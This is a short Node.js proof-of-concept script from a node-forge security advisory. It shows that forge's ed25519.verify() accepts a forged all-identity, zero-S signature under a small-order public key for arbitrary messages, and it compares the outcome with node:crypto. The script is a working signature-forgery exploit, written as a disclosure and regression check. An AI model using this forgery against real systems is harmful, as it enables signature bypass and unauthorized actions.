#!/usr/bin/env node
'use strict';

// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-6889-vf6x-f3g5
//
// Reported by @analisaperlengkapan.
//
// Test vectors from this code were added in the ed25519 unit tests.
//
// ed25519.verify() accepted a signature with R = identity and S = 0 under
// the identity (small-order) public key for any message. node:crypto
// (OpenSSL) rejects the same input.

const crypto = require('crypto');
const forge = require('../../lib/index');

const IDENTITY = Buffer.concat([Buffer.from([0x01]), Buffer.alloc(31)]); // y = 1, sign 0
const SIG = Buffer.concat([IDENTITY, Buffer.alloc(32)]);                 // R = identity, S = 0

const der = Buffer.concat([Buffer.from('302a300506032b6570032100', 'hex'), IDENTITY]);
const key = crypto.createPublicKey({key: der, format: 'der', type: 'spki'});

let forged = 0;
for (const msg of ['', 'hello', 'admin=true', 'transfer 1000 to attacker']) {
  const ok = forge.ed25519.verify({
    message: msg,
    encoding: 'utf8',
    signature: SIG.toString('binary'),
    publicKey: IDENTITY.toString('binary'),
  });
  const native = crypto.verify(null, Buffer.from(msg), key, SIG);
  console.log(JSON.stringify(msg).padEnd(28), 'forge:', ok, ' node:crypto:', native);
  if (ok) forged++;
}

if (forged > 0) {
  console.log('VULNERABLE: forge accepted the forged signature for ' + forged + ' messages.');
  process.exit(1);
}
console.log('OK: forged signatures rejected.');
